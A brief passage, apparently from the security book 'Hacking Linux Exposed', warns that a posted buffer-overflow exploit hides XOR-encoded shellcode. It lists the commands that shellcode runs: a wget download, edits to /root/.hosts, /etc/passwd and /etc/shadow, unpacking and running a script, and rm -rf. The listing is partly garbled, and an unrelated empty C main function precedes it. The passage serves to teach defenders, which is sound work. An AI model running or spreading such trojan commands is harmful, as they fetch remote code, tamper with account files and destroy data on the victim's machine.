
```
int main() {

}
```

## Hacking Linux Exposed: Linux Security Secrets & Solutions

Scripts that perform buffer overflows commonly have such sections of machine code that is designed to test or exploit the vulnerability. Unless you analyzed this code, you may take the post at face value. Although slightly obfuscated (the actual code is XOR encoded), this exploit will actually run the following commands against your machine:

```
wget +com;
echo ' ' >>/root/.hosts;
echo /sbin/netstat -na /dev/null;
rm -rf h.tar;
echo >>/etc/passwd;
echo >>/etc/shadow;
wget h.tar -xf h.tar >dev/null;
sh/run.sh;
rm -rf
```
